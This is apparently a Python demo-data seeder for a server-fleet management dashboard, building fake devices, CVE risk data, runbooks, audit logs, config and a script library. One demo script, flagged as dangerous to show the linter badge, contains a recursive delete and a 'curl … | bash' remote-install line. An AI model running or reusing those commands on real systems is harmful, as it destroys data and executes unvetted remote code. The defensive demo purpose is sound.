                 'references': [f'https://nvd.nist.gov/vuln/detail/{c[0]}']}
                for c in chosen
            ],
        }
    return out


def build_kev_epss() -> dict:
    """v3.14.0 demo: the CISA KEV + FIRST EPSS overlay so the CVEs page ranks by
    real-world risk offline (no live feed fetch in the demo). Two of the seeded
    CVEs are flagged actively-exploited; all carry an EPSS probability. Matched
    to findings by vuln_id in _enrich_cve_findings()."""
    return {
        'kev': ['CVE-2024-23456', 'CVE-2023-99999'],
        'epss': {
            'CVE-2024-23456': 0.9421,
            'CVE-2023-99999': 0.6088,
            'CVE-2024-12345': 0.1773,
            'CVE-2024-34567': 0.0421,
            'CVE-2024-45678': 0.0093,
        },
        'last_checked': now() - 3600 * 5,
        'kev_error': '', 'epss_error': '',
    }


def build_packages() -> dict:
    """Per-device pending updates list."""
    out = {}
    sample_packages = [
        ('libssl3', '3.0.2-0ubuntu1.16', '3.0.2-0ubuntu1.18'),
        ('curl', '7.81.0-1ubuntu1.16', '7.81.0-1ubuntu1.20'),
        ('python3.10', '3.10.12-1~22.04.7', '3.10.12-1~22.04.10'),
        ('linux-image-generic', '5.15.0.119.119', '5.15.0.122.122'),
        ('systemd', '249.11-0ubuntu3.12', '249.11-0ubuntu3.16'),
        ('openssh-server', '8.9p1-3ubuntu0.10', '8.9p1-3ubuntu0.13'),
        ('nginx-core', '1.18.0-6ubuntu14.4', '1.18.0-6ubuntu14.5'),
        ('docker.io', '24.0.5-0ubuntu1~22.04.1', '24.0.7-0ubuntu1~22.04.1'),
    ]
    for dev in FAKE_DEVICES:
        if dev['agentless']:
            continue
        rng = _seeded_random(dev['id'], 'packages')
        n = rng.choices([0, 0, 1, 3, 7, 12, 23], k=1)[0]
        if n == 0:
            continue
        out[dev['id']] = {
            'last_updated': now() - rng.randint(60, 3600),
            # ecosystem + count let the CVE report mark the host "scanned"
            # (without an ecosystem it reads as "unsupported").
            'ecosystem':    'deb',
            'count':        rng.randint(420, 1180),
            'upgradable':   rng.sample(sample_packages, min(n, len(sample_packages))) if n <= len(sample_packages)
                            else rng.choices(sample_packages, k=n),
        }
    return out


def build_cmdb() -> dict:
    """CMDB metadata + multi-doc examples."""
    rng = random.Random(7)
    out = {}

    runbook_proxmox = """# Proxmox runbook

## Routine maintenance

- Update package list: `apt update && apt list --upgradable`
- Apply updates during maintenance window (Sundays 03:00 UTC)
- Run `pvecm status` to check cluster health
- Verify backups: PBS schedule fires daily at 02:00

## Emergency

- Hardware fail: SSH to backup hypervisor, restore from PBS
- Network: console access via IPMI at 10.0.0.50
- See vendor runbook in cabinet B
"""
    hardware_proxmox = """# Hardware spec

| Component | Detail |
|---|---|
| CPU | AMD EPYC 7402P (24c / 48t) |
| RAM | 256 GB DDR4 ECC |
| Storage | 2x 2TB NVMe (mirror), 4x 18TB HDD (RAID-Z2) |
| Network | 2x 10GbE SFP+ |
| Chassis | SuperMicro AS-1014S-WTRT |
| Purchased | 2023-06 |
| Warranty until | 2026-06 |
"""

    runbook_truenas = """# TrueNAS runbook

## Pools
- **tank** (RAID-Z2, 6x 18TB) — primary data
- **fast** (mirror, 2x 2TB NVMe) — VM datasets

## Datasets
- tank/media — Jellyfin library, NFSv4 to media VM
- tank/backups — Restic repository for offsite hosts
- fast/vms — iSCSI targets to Proxmox

## Snapshots
- Daily, retained 14 days
- Weekly, retained 8 weeks
- Replicated nightly to backup.lab
"""

    out['pmx01'] = {
        'asset_id':        'INF-PMX-001',
        'server_function': 'hypervisor',
        'hypervisor_url':  'https://proxmox.lab:8006',
        'ssh_port':        22,
        'documentation':   '',
        'docs': [
            {'id': 'd1a', 'title': 'Runbook', 'body': runbook_proxmox,
             'created_by': 'demo', 'created_at': now() - 86400 * 90,
             'updated_by': 'demo', 'updated_at': now() - 86400 * 7},
            {'id': 'd1b', 'title': 'Hardware spec', 'body': hardware_proxmox,
             'created_by': 'demo', 'created_at': now() - 86400 * 365,
             'updated_by': 'demo', 'updated_at': now() - 86400 * 60},
        ],
        # v3.5.0 lifecycle expiry — hardware warranty is "soon" (≤90d),
        # the hypervisor support contract has already lapsed.
        'warranty_expiry':         _iso_in_days(74),
        'license_expiry':          '',
        'support_contract_expiry': _iso_in_days(-12),
        # v3.7.0 credentials — metadata only; ct/nonce stay empty (the list
        # endpoint never decrypts, only /reveal does). One is overdue.
        'credentials':     [
            {'id': _stable_id('cred', 'pmx01', 'root'), 'label': 'root console',
             'username': 'root', 'note': 'IPMI + PVE web UI',
             'nonce': '', 'ct': '',
             'created_by': 'demo', 'created_at': now() - 86400 * 400,
             'updated_by': 'demo', 'updated_at': now() - 86400 * 400,
             'rotate_after_days': 180, 'rotated_at': now() - 86400 * 320},  # overdue
            {'id': _stable_id('cred', 'pmx01', 'api'), 'label': 'PVE API token',
             'username': 'automation@pve', 'note': 'used by RemotePower',
             'nonce': '', 'ct': '',
             'created_by': 'demo', 'created_at': now() - 86400 * 60,
             'updated_by': 'demo', 'updated_at': now() - 86400 * 60,
             'rotate_after_days': 365, 'rotated_at': now() - 86400 * 60},
        ],
        'updated_by':      'demo',
        'updated_at':      now() - 86400 * 7,
    }
    out['tnas'] = {
        'asset_id':        'STO-NAS-001',
        'server_function': 'storage',
        'hypervisor_url':  'https://truenas.lab',
        'ssh_port':        22,
        'documentation':   '',
        'docs': [
            {'id': 'd2a', 'title': 'Runbook', 'body': runbook_truenas,
             'created_by': 'demo', 'created_at': now() - 86400 * 200,
             'updated_by': 'demo', 'updated_at': now() - 86400 * 14},
        ],
        # Warranty expired; disk-shelf support contract due within 30d (warn).
        'warranty_expiry':         _iso_in_days(-40),
        'license_expiry':          '',
        'support_contract_expiry': _iso_in_days(18),
        'credentials':     [
            {'id': _stable_id('cred', 'tnas', 'admin'), 'label': 'TrueNAS admin',
             'username': 'admin', 'note': 'web UI',
             'nonce': '', 'ct': '',
             'created_by': 'demo', 'created_at': now() - 86400 * 220,
             'updated_by': 'demo', 'updated_at': now() - 86400 * 90,
             'rotate_after_days': 180, 'rotated_at': now() - 86400 * 90},
        ],
        'updated_by':      'demo',
        'updated_at':      now() - 86400 * 14,
    }
    # A few more with single docs to exercise the mix. The 4-tuple's last
    # element is the lifecycle expiry plan (warranty/license/support days from
    # today, or None to leave blank) so the Lifecycle page has a spread of
    # expired / ≤30d / ≤90d / far states.
    for dev_id, function, doc_title, doc_body, expiry in [
        ('fw01',  'firewall',  'Notes',         '# OPNsense firewall\n\nWAN: ISP-provided modem on em0.\nLAN: 10.0.0.0/24, em1.\nDMZ: 10.0.99.0/24, em2.',
         {'warranty': 250, 'license': 6,   'support': None}),   # license expiring within a week
        ('jf01',  'media',     'Plex/Jellyfin','# Media server\n\nLibrary mounts /mnt/media via NFS from truenas.lab.\nReverse-proxied via nginx.lab.',
         {'warranty': None, 'license': None, 'support': None}),  # nothing tracked
        ('gt01',  'git',       'Git server',    '# Gitea\n\nDB: postgres in same compose stack.\nBackups: daily restic snapshot to backup.lab.',
         {'warranty': 410, 'license': 800, 'support': None}),    # all far out — quiet
        ('nc01',  'cloud',     'Nextcloud',     '# Nextcloud\n\nApache + PHP-FPM. Data on /mnt/data NFS share.\nDB: mariadb.\nRedis cache occasionally needs a restart.',
         {'warranty': -90, 'license': 60,  'support': None}),    # warranty long expired, license ≤90d
    ]:
        creds = []
        if dev_id == 'nc01':
            creds = [
                {'id': _stable_id('cred', 'nc01', 'admin'), 'label': 'Nextcloud admin',
                 'username': 'ncadmin', 'note': 'occ + web UI',
                 'nonce': '', 'ct': '',
                 'created_by': 'demo', 'created_at': now() - 86400 * 500,
                 'updated_by': 'demo', 'updated_at': now() - 86400 * 500,
                 'rotate_after_days': 90, 'rotated_at': now() - 86400 * 200},  # very overdue
                {'id': _stable_id('cred', 'nc01', 'db'), 'label': 'MariaDB',
                 'username': 'nextcloud', 'note': '',
                 'nonce': '', 'ct': '',
                 'created_by': 'demo', 'created_at': now() - 86400 * 20,
                 'updated_by': 'demo', 'updated_at': now() - 86400 * 20,
                 'rotate_after_days': 365, 'rotated_at': now() - 86400 * 20},
            ]
        elif dev_id == 'gt01':
            creds = [
                {'id': _stable_id('cred', 'gt01', 'deploy'), 'label': 'deploy key',
                 'username': 'git', 'note': 'CI runner',
                 'nonce': '', 'ct': '',
                 'created_by': 'demo', 'created_at': now() - 86400 * 30,
                 'updated_by': 'demo', 'updated_at': now() - 86400 * 30,
                 'rotate_after_days': 180, 'rotated_at': now() - 86400 * 30},
            ]
        out[dev_id] = {
            'asset_id':        '',
            'server_function': function,
            'hypervisor_url':  '',
            'ssh_port':        22,
            'documentation':   '',
            'docs': [
                {'id': f'd_{dev_id}', 'title': doc_title, 'body': doc_body,
                 'created_by': 'demo', 'created_at': now() - 86400 * 30,
                 'updated_by': 'demo', 'updated_at': now() - 86400 * 5},
            ],
            'warranty_expiry':         _iso_in_days(expiry['warranty']) if expiry['warranty'] is not None else '',
            'license_expiry':          _iso_in_days(expiry['license'])  if expiry['license']  is not None else '',
            'support_contract_expiry': _iso_in_days(expiry['support'])  if expiry['support']  is not None else '',
            'credentials':     creds,
            'updated_by':      'demo',
            'updated_at':      now() - 86400 * 5,
        }
    return out


def build_history() -> list:
    """A handful of past commands shown on the History page."""
    return [
        {'ts': now() - 3600 * 1,  'actor': 'demo', 'device': 'pmx01',  'action': 'reboot',           'detail': 'scheduled — kernel update'},
        {'ts': now() - 3600 * 4,  'actor': 'demo', 'device': 'jf01',   'action': 'exec',             'detail': 'systemctl restart jellyfin'},
        {'ts': now() - 3600 * 8,  'actor': 'demo', 'device': 'nc01',   'action': 'upgrade',          'detail': 'apt-get upgrade — 12 packages'},
        {'ts': now() - 86400 * 1, 'actor': 'demo', 'device': 'gt01',   'action': 'exec',             'detail': 'docker compose pull && docker compose up -d'},
        {'ts': now() - 86400 * 2, 'actor': 'demo', 'device': 'tnas',   'action': 'exec',             'detail': 'zpool scrub tank'},
        {'ts': now() - 86400 * 3, 'actor': 'demo', 'device': 'pi1',    'action': 'reboot',           'detail': 'manual'},
        {'ts': now() - 86400 * 5, 'actor': 'demo', 'device': 'pmx01',  'action': 'upgrade',          'detail': 'apt-get upgrade — 7 packages'},
        {'ts': now() - 86400 * 7, 'actor': 'demo', 'device': 'all',    'action': 'agent_update',     'detail': 'fleet-wide agent update to v2.2.0'},
    ]


def build_audit_log() -> dict:
    """Small audit-log sample so the Audit page isn't empty."""
    entries = [
        {'ts': now() - 3600 * 2,  'actor': 'demo', 'action': 'login',          'detail': '', 'source_ip': '203.0.113.42', 'user_agent': 'Mozilla/5.0'},
        {'ts': now() - 3600 * 4,  'actor': 'demo', 'action': 'cmdb_doc_add',   'detail': 'device=pmx01 doc=d1c title="Network notes"', 'source_ip': '203.0.113.42', 'user_agent': 'Mozilla/5.0'},
        {'ts': now() - 86400 * 1, 'actor': 'demo', 'action': 'webhook_test',   'detail': 'event=metric_warning to https://ntfy.sh/...', 'source_ip': '203.0.113.42', 'user_agent': 'Mozilla/5.0'},
        {'ts': now() - 86400 * 2, 'actor': 'demo', 'action': 'apikey_created', 'detail': 'label="grafana-scrape"', 'source_ip': '203.0.113.42', 'user_agent': 'curl/8.5.0'},
        {'ts': now() - 86400 * 4, 'actor': 'demo', 'action': 'login',          'detail': '', 'source_ip': '198.51.100.7', 'user_agent': 'Mozilla/5.0'},
    ]
    return {'entries': entries}


def build_tls_targets() -> dict:
    return {
        'targets': [
            {'id': 'lab', 'label': 'lab cert',     'host': 'remote.lab',   'port': 443, 'type': 'tls'},
            {'id': 'wld', 'label': 'wildcard',     'host': 'apps.lab',     'port': 443, 'type': 'tls'},
            {'id': 'mx',  'label': 'MX record',    'host': 'lab',          'port': 0,   'type': 'dns'},
        ],
    }


def build_tls_results() -> dict:
    return {
        'lab': {'ts': now() - 1800, 'days_left': 47, 'issuer': "Let's Encrypt", 'sans': ['remote.lab', '*.remote.lab']},
        'wld': {'ts': now() - 1800, 'days_left': 12, 'issuer': "Let's Encrypt", 'sans': ['*.apps.lab']},
        'mx':  {'ts': now() - 1800, 'days_left': 99, 'min_ttl': 3600},
    }


def build_scripts() -> dict:
    """v2.2.0 Script Library demo content. Five realistic operations
    runbooks, one of them deliberately flagged dangerous so the UI's
    `⚠ DANGER` badge is visible in the demo."""
    base_ts = now() - 86400 * 14
    return {
        'scripts': [
            {
                'id':          'demo-rotate-nginx-logs',
                'name':        'rotate-nginx-logs',
                'description': 'Compress access logs > 7 days old, move to /mnt/backup, signal nginx to reopen handles',
                'body':        '#!/usr/bin/env bash\n'
                               'set -euo pipefail\n\n'
                               'shopt -s nullglob\n'
                               'for f in /var/log/nginx/*.log.[0-9]; do\n'
                               '  gzip -f "$f"\n'
                               'done\n'
                               'find /var/log/nginx -name "*.log.*.gz" -mtime +7 \\\n'
                               '  -exec mv {} /mnt/backup/nginx-logs/ \\;\n'
                               'systemctl reload nginx\n',
                'created':     base_ts,
                'updated':     base_ts + 3600,
                'created_by':  'demo',
                'last_lint':   {'ok': True, 'syntax_error': None, 'dangerous': []},
            },
            {
                'id':          'demo-cert-renew-check',
                'name':        'cert-renew-dry-run',
                'description': 'acme.sh --renew-all --dryrun to see which certs are about to renew',
                'body':        '#!/usr/bin/env bash\n'
                               'set -euo pipefail\n\n'
                               'cd /root/.acme.sh\n'
                               './acme.sh --cron --home /root/.acme.sh --dryrun 2>&1\n',
                'created':     base_ts + 3600,
                'updated':     base_ts + 3600,
                'created_by':  'demo',
                'last_lint':   {'ok': True, 'syntax_error': None, 'dangerous': []},
            },
            {
                'id':          'demo-zfs-snapshot-prune',
                'name':        'zfs-snapshot-prune',
                'description': 'Keep last 7 daily + 4 weekly snapshots per dataset, destroy the rest',
                'body':        '#!/usr/bin/env bash\n'
                               'set -euo pipefail\n\n'
                               'for ds in $(zfs list -H -o name); do\n'
                               '  snaps=$(zfs list -H -t snapshot -o name "$ds" 2>/dev/null \\\n'
                               '          | grep "@auto-daily-" | sort -r | tail -n +8)\n'
                               '  for s in $snaps; do\n'
                               '    zfs destroy "$s"\n'
                               '  done\n'
                               'done\n',
                'created':     base_ts + 7200,
                'updated':     base_ts + 86400,
                'created_by':  'demo',
                'last_lint':   {'ok': True, 'syntax_error': None, 'dangerous': []},
            },
            {
                'id':          'demo-pull-all-compose',
                'name':        'pull-all-compose-stacks',
                'description': 'Find every docker-compose.yml under /opt and run docker compose pull. Useful before a maintenance window.',
                'body':        '#!/usr/bin/env bash\n'
                               'set -euo pipefail\n\n'
                               'while IFS= read -r f; do\n'
                               '  echo "=== ${f%/*} ==="\n'
                               '  ( cd "${f%/*}" && docker compose pull )\n'
                               'done < <(find /opt -maxdepth 4 -name docker-compose.yml)\n',
                'created':     base_ts + 86400 * 3,
                'updated':     base_ts + 86400 * 3,
                'created_by':  'demo',
                'last_lint':   {'ok': True, 'syntax_error': None, 'dangerous': []},
            },
            {
                'id':          'demo-dangerous-example',
                'name':        'wipe-bind-mount-DANGER',
                'description': 'EXAMPLE — kept around to demonstrate the dangerous-pattern UI badge. Do not run.',
                'body':        '#!/usr/bin/env bash\n'
                               '# This intentionally contains dangerous patterns to show how the\n'
                               '# dry-run lint flags them. Demo only.\n'
                               'rm -rf /mnt/wipe/*\n'
                               'curl https://example.com/install.sh | bash\n',
                'created':     base_ts + 86400 * 7,
                'updated':     base_ts + 86400 * 7,
                'created_by':  'demo',
                'last_lint':   {
                    'ok':           True,
                    'syntax_error': None,
                    'dangerous':    ['curl … | bash (remote code execution)'],
                },
            },
        ],
    }


def build_batch_jobs() -> dict:
    """One recently-completed batch job so the demo shows the
    /api/exec/batch/<id> status panel with real output."""
    job_ts = now() - 1200    # 20 minutes ago
    return {
        'jobs': {
            'demo-batch-0001': {
                'id':          'demo-batch-0001',
                'script_id':   'demo-cert-renew-check',
                'script_name': 'cert-renew-dry-run',
                'actor':       'demo',
                'created':     job_ts,
                'targets':     ['dev-web01', 'dev-cloud01', 'dev-proxy01'],
                'per_device':  {
                    'dev-web01':   {'queued': True, 'name': 'web01.lab',
                                    'queued_at': job_ts},
                    'dev-cloud01': {'queued': True, 'name': 'cloud01.lab',
                                    'queued_at': job_ts},
                    'dev-proxy01': {'queued': True, 'name': 'proxy01.lab',
                                    'queued_at': job_ts},
                },
                'dangerous':   [],
            },
        },
    }


def build_log_watch() -> dict:
    """Minimal log-watch state so the demo's log_alert webhook example
    has something to render. One global rule, one fired alert from
    20 minutes ago — enough for the Notifications panel to show the
    new 'matched line' format we added in 2.1.1."""
    base_ts = now() - 1200
    return {
        'rules': [
            {
                'id':        'demo-mail-errors',
                'scope':     'global',
                'unit':      'postfix.service',
                'pattern':   'warning|error|critical|FATAL',
                'threshold': 1,
            },
            {
                'id':        'demo-ssh-failed',
                'scope':     'global',
                'unit':      'sshd.service',
                'pattern':   'Failed password|Invalid user',
                'threshold': 5,
            },
        ],
        'recent_alerts': [
            {
                'ts':       base_ts,
                'device':   'pmg01.lab',
                'unit':     'postfix.service',
                'pattern':  'warning|error|critical|FATAL',
                'count':    1,
                'sample':   ['Nov 13 12:00:01 pmg01 postfix/smtpd[1234]: '
                             'warning: unknown[10.0.0.5]: SASL LOGIN '
                             'authentication failed: authentication failure'],
            },
        ],
    }


def build_self_backup_state() -> dict:
    """v3.0.2 — daily backup state. Seed it as 'never run' so visitors see
    the empty state on the Server status page, with a clear 'Run backup
    now' affordance."""
    return {
        'last_run':    0,
        'last_path':   '',
        'last_size':   0,
        'last_pruned': 0,
    }


def build_ignored_items() -> dict:
    """v3.0.2 — operator-suppressed alerts. Empty by default; demo visitors
    can exercise the × button on Needs Attention cards in their session."""
    return {
        'needs_attention': [],
        'containers':      [],
        'devices':         [],
    }


def build_acme_state() -> dict:
    """v3.0.2 — per-device acme.sh state. One demo device has acme.sh
    installed with two certs; the rest are skipped from the table (the
    'acme.sh not installed' rows are filtered in v3.0.2).
    """
    return {
        'devices': {
            'ng01': {
                'available': True,
                'version':   '3.4.0',
                'home':      '/root/.acme.sh',
                'last_scan': now() - 3600,
                'certs': [
                    {
                        'domain':       'demo.lab',
                        'challenge':    'dns_cf',
                        'provider':     'cloudflare',
                        'created_at':   now() - 86400 * 60,
                        'next_renewal': now() + 86400 * 30,
                        'status':       'ok',
                    },
                    {
                        'domain':       'wiki.demo.lab',
                        'challenge':    'http',
                        'provider':     'letsencrypt',
                        'created_at':   now() - 86400 * 75,
                        'next_renewal': now() + 86400 * 15,
                        'status':       'ok',
                    },
                ],
            },
            # Other devices: not available (acme.sh not installed) — these
            # used to render as noise rows in the table; v3.0.2 hides them
            # and surfaces a count above the table. Including a couple
            # here exercises that path.
            'pmx01': {'available': False, 'last_scan': now() - 3600},
            'tnas':  {'available': False, 'last_scan': now() - 3600},
        },
    }


def build_port_baseline() -> dict:
    """v3.0.2 — listening-port baseline for new-port-detected webhook.
    Empty initial baseline; the demo doesn't simulate detections."""
    return {}


def build_ssh_key_baseline() -> dict:
    """v4 demo: authorized_keys across a few hosts so the SSH-key audit page has
    content. Includes a key REUSED on two hosts (flagged "N hosts") and a weak
    legacy ssh-dss key (flagged weak). Format is the on-disk shape the audit
    reads: {dev_id: {user: ["<type> <base64> <comment>", ...]}}."""
    def _blob(seed: str) -> str:
        # Deterministic, VALID base64 (decodes cleanly) so the audit's SHA256
        # fingerprint and key-reuse detection work on the seeded keys.
        return base64.b64encode(hashlib.sha256(('rpdemo-ssh-' + seed).encode()).digest()).decode()
    shared = 'ssh-ed25519 ' + _blob('shared-ops-bastion') + ' ops@bastion'
    return {
        'gt01': {
            'root':   [shared],                                  # reused (also on nc01)
            'deploy': ['ssh-ed25519 ' + _blob('gt01-deploy') + ' deploy@ci'],
        },
        'nc01': {
            'root':   [shared],                                  # reused (also on gt01)
            'admin':  ['ssh-rsa ' + _blob('nc01-admin') + ' admin@laptop'],
        },
        'bk01': {
            'backup': ['ssh-ed25519 ' + _blob('bk01-backup') + ' backup@nas',
                       'ssh-dss ' + _blob('legacy-dss') + ' legacy@old-host'],  # weak (ssh-dss)
        },
        'pmx01': {
            'root':   ['ssh-ed25519 ' + _blob('pmx01-root') + ' jakob@workstation'],
        },
    }


def build_brute_force() -> dict:
    """v3.0.2 — sshd auth-failure tracker. Empty in demo (no real auth)."""
    return {}


def build_proxmox_snapshot_cache() -> dict:
    """v3.0.2 — Proxmox snapshot cache. Empty unless Proxmox is set up."""
    return {}


def build_uptime() -> dict:
    """v3.0.2 — 7-day uptime history for the Fleet roster stripe.

    Without this, the Fleet roster shows "unknown" for every day until
    real heartbeats accumulate. For a static demo with no live agents,
    that's a bad first impression — the page looks broken.

    Seeds a deterministic synthetic history: every monitored agented
    device gets one 'up' event at the start of each of the past 7 days
    plus a closing 'up' just before now. One device gets a believable
    outage to make the stripe visually varied.
    """
    DAY = 86400
    now_ts = now()
    today_start = now_ts - (now_ts % DAY)
    out = {}
    for i, dev in enumerate(FAKE_DEVICES):
        if dev.get('agentless'):
            continue
        # bk01 is unmonitored in the demo — skip per the handler's logic
        if dev['id'] == 'bk01':
            continue
        rng  = _seeded_random(dev['id'], 'uptime')
        events = []
        # Insert a believable outage on day 4 (3 days ago) for hosts
        # whose hash places them in the "had an incident" bucket.
        had_outage_day = rng.randint(1, 5) if rng.random() < 0.4 else -1
        for d in range(7):
            day_start = today_start - (6 - d) * DAY
            events.append({'ts': day_start + rng.randint(60, 1800), 'online': True})
            if d == had_outage_day:
                start  = day_start + rng.randint(7200, 64800)
                length = rng.randint(300, 1500)
                events.append({'ts': start,            'online': False})
                events.append({'ts': start + length,   'online': True})
        events.append({'ts': now_ts - 30, 'online': True})
        out[dev['id']] = {'name': dev['name'], 'events': events}
    return out


def build_config() -> dict:
    """Server config — v3.0.2 schema.

    Demonstrates the new multi-webhook editor with two destinations
    (a Discord-shaped one and a Pushover one with placeholder creds),
    plus the v3.0.2 reliability config: audit log retention, scheduled
    backup, session TTLs.
    """
    return {
        'server_name':       'RemotePower Demo',
        'server_version':    '3.13.0',
        'agent_version':     '3.13.0',
        'remember_me_default': True,

        # v3.0.2 multi-webhook destinations. The legacy webhook_url is
        # left empty; new setups should use webhook_urls. Pushover creds
        # are placeholders (the demo is read-only — no real fires).
        'webhook_url':       '',
        'webhook_urls': [
            {
                'id':      'wh_discord_demo',
                'name':    'Discord — operations channel',
                'url':     'https://discord.com/api/webhooks/000000000000000000/demo-not-a-real-webhook',
                'format':  'discord',
                'enabled': True,
            },
            {
                'id':           'wh_pushover_demo',
                'name':         'Pushover — critical only',
                'url':          'https://api.pushover.net/1/messages.json',
                'format':       'pushover',
                'enabled':      True,
                'min_priority': 2,                    # critical only
                'pushover_token': 'apDEMO_TOKEN_NOT_REAL',
                'pushover_user':  'uDEMO_USER_NOT_REAL',
            },
        ],

        # Default metric thresholds — same as production defaults
        'metric_thresholds': {
            'mem_warn_percent': 85, 'mem_crit_percent': 95,
            'disk_warn_percent': 80, 'disk_crit_percent': 90,
            'swap_warn_percent': 20, 'swap_crit_percent': 50,
            'cpu_warn_load_ratio': 1.5, 'cpu_crit_load_ratio': 3.0,
        },

        # v3.0.2 — audit log age-based retention
        'audit_log_retention_days': 90,

        # v3.0.2 — configurable session TTLs (defaults match production)
        'session_ttl_short': 86400,        # 24h without remember-me
        'session_ttl_long':  2592000,      # 30d with remember-me

        # v3.0.2 — scheduled backup of /var/lib/remotepower
        'backup_enabled':         True,
        'backup_path':            '/var/lib/remotepower/backups',
        'backup_retention_days':  14,

        # v3.6.0 — Proxmox backup recency threshold (drives proxmox_backup NA)
        'proxmox_backup_warn_days': 7,

        # v3.7.0 — change approval (maker-checker). Enabled, and a different
        # admin must approve (no self-approval) so the demo's pending
        # confirmations are meaningful.
        'change_approval_enabled':  True,
        'change_approval_no_self':  True,

        # v3.7.0 — audit log forwarding to a SIEM. Disabled in the demo, with
        # placeholder (non-real, non-routable) targets so the editor renders
        # populated. No real fires happen in read-only mode anyway.
        'audit_forward_enabled': False,
        'audit_forward_mode':    'http',
        'audit_forward_url':     'https://siem.example.invalid/ingest',
        'audit_forward_token':   'PLACEHOLDER_NOT_REAL',
        'audit_forward_host':    'siem.example.invalid',
        'audit_forward_port':    514,
        'audit_forward_tcp':     False,

        # v3.11.0 — software policy rules (Software policy page).
        'software_policy': {'rules': [
            {'type': 'required',    'package': 'fail2ban'},
            {'type': 'banned',      'package': 'telnetd'},
            {'type': 'min_version', 'package': 'openssl', 'version': '3.0.2'},
            {'type': 'required',    'package': 'unattended-upgrades', 'tags': ['prod']},
        ]},

        # v3.13.0 — drift config: global default + named profiles + assignments.
        'drift': {
            'enabled': True,
            'default_watched_files': [
                '/etc/ssh/sshd_config', '/etc/sudoers', '/etc/fstab',
                '/etc/crontab', '/etc/hosts', '/etc/resolv.conf',
            ],
            'profiles': [
                {'id': 'dp_web', 'name': 'Web servers',
                 'files': ['/etc/nginx/nginx.conf', '/etc/ssh/sshd_config',
                           '/etc/letsencrypt/cli.ini', '/etc/hosts'],
                 'created': now() - 86400 * 30, 'updated': now() - 86400 * 4},
                {'id': 'dp_db', 'name': 'Database hosts',
                 'files': ['/etc/mysql/my.cnf', '/etc/ssh/sshd_config', '/etc/fstab'],
                 'created': now() - 86400 * 20, 'updated': now() - 86400 * 2},
            ],
            'assignments': [
                {'scope_type': 'tag',    'scope_value': 'web',  'profile_id': 'dp_web'},
                {'scope_type': 'device', 'scope_value': 'nc01', 'profile_id': 'dp_db'},
            ],
        },
    }


def build_links() -> list:
    """External-links page samples."""
    # No emoji icons — CLAUDE.md forbids emoji in the UI. The icon field is
    # left blank (the links renderer shows title + hostname; an empty icon is
    # the supported "no icon" value).
    return [
        {'id': 'l1', 'category': 'Monitoring', 'label': 'Grafana',         'url': 'https://prometheus.lab/grafana',  'icon': ''},
        {'id': 'l2', 'category': 'Monitoring', 'label': 'Prometheus',      'url': 'https://prometheus.lab',          'icon': ''},
        {'id': 'l3', 'category': 'Storage',    'label': 'TrueNAS',         'url': 'https://truenas.lab',             'icon': ''},
        {'id': 'l4', 'category': 'Network',    'label': 'OPNsense',        'url': 'https://opnsense.lab',            'icon': ''},
        {'id': 'l5', 'category': 'Network',    'label': 'UniFi controller','url': 'https://10.0.0.50',               'icon': ''},
        {'id': 'l6', 'category': 'Services',   'label': 'Pi-hole admin',   'url': 'https://pihole.lab/admin',        'icon': ''},
        {'id': 'l7', 'category': 'Services',   'label': 'Vaultwarden',     'url': 'https://vaultwarden.lab',         'icon': ''},
    ]


# ─── Main ─────────────────────────────────────────────────────────────────────


def build_hardware() -> dict:
    """v3.4.0 demo: SMART + kernel/livepatch so the device drawer's
    Health & Hardware card has something to show. One disk on the NAS is
    failing (drives the SMART alert and a red health pill); one host has a
    newer kernel installed and is waiting on a reboot."""
    # dev_id -> (disk specs as (device, health, model, reallocated_sectors),
    #            kernel-needs-reboot?)
    specs = {
        'tnas':  ([('/dev/sda', 'PASSED', 'WDC WD40EFRX',   0),
                   ('/dev/sdb', 'PASSED', 'WDC WD40EFRX',   0),
                   ('/dev/sdc', 'FAILED', 'WDC WD40EFRX',  24),   # failing
                   ('/dev/sdd', 'PASSED', 'WDC WD40EFRX',   0)], False),
        'pmx01': ([('/dev/nvme0n1', 'PASSED', 'Samsung SSD 980 1TB', 0)], True),
        'nc01':  ([('/dev/sda', 'PASSED', 'Crucial MX500',  0)], False),
        'bk01':  ([('/dev/sda', 'PASSED', 'Seagate IronWolf', 0),
                   ('/dev/sdb', 'PASSED', 'Seagate IronWolf', 0)], False),
        'gt01':  ([('/dev/sda', 'PASSED', 'Samsung SSD 870',  0)], False),
    }
    # Board/CPU/chipset temperature sensors (feeds the Thermal "hottest hosts"
    # roll-up). gt01 runs CRITICAL (≥85 °C), pmx01 runs HOT (≥75 °C) so the page
    # shows red + amber, the rest are comfortable.
    temps_map = {
        'tnas':  [('CPU', 52.0), ('Mainboard', 41.0)],
        'pmx01': [('Package id 0', 79.0), ('Core 0', 77.5)],   # HOT
        'nc01':  [('CPU', 49.0)],
        'bk01':  [('CPU', 44.0)],
        'gt01':  [('CPU', 88.5), ('Chipset', 63.0)],           # CRITICAL
    }
    # GPUs report temp + power draw (feeds Thermal + Power).
    gpus_map = {
        'gt01':  [{'name': 'NVIDIA GeForce RTX 3060', 'temp_c': 71.0, 'power_w': 142.0}],
    }
    # UPS units (feeds Power + Chargeback). pmx01 is on battery (OB) so the page
    # shows the on-battery state; both report load/runtime/draw.
    ups_map = {
        'tnas':  [{'name': 'APC Back-UPS 1500', 'status': 'OL',
                   'battery_pct': 100, 'load_pct': 38, 'runtime_s': 1980, 'power_w': 210.0}],
        'pmx01': [{'name': 'Eaton 5P 1550', 'status': 'OB DISCHRG',
                   'battery_pct': 74, 'load_pct': 52, 'runtime_s': 720, 'power_w': 305.0}],
    }
    ts = now()
    out = {}
    for dev_id, (disk_specs, reboot) in specs.items():
        rng = _seeded_random('hardware', dev_id)
        disks = []
        for device, health, model, realloc in disk_specs:
            failed = (health != 'PASSED') or realloc > 0
            disks.append({
                'device': device, 'health': health, 'model': model,
                'serial': f"S{rng.randint(10**9, 10**10 - 1)}",
                'reallocated_sectors':   realloc,
                'pending_sectors':       rng.randint(1, 4) if realloc else 0,
                'offline_uncorrectable': 0,
                'temperature_c':  rng.randint(30, 44),
                'power_on_hours': rng.randint(8000, 41000),
                'failed': failed,
            })
        running = '6.1.0-21-amd64'
        latest  = '6.1.0-27-amd64' if reboot else running
        rec = {
            'smart':  disks,
            'kernel': {'running': running, 'latest_installed': latest,
                       'reboot_for_kernel': reboot},
            'ts': ts,
        }
        if dev_id in temps_map:
            rec['temps'] = [{'label': lbl, 'current_c': c} for lbl, c in temps_map[dev_id]]
        if dev_id in gpus_map:
            rec['gpus'] = gpus_map[dev_id]
        if dev_id in ups_map:
            rec['ups'] = ups_map[dev_id]
        out[dev_id] = rec
    return out


